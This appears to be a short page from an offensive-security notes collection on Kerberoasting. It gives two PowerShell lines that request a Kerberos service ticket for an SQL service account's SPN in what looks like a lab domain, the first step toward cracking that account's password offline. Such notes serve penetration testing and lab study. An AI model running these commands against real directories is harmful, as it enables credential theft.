# Kerberoasting

### Request TGS for kerberoastable account (SPN)

{% code overflow="wrap" %}
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sqlserver.ad-attacks.local"
```
{% endcode %}

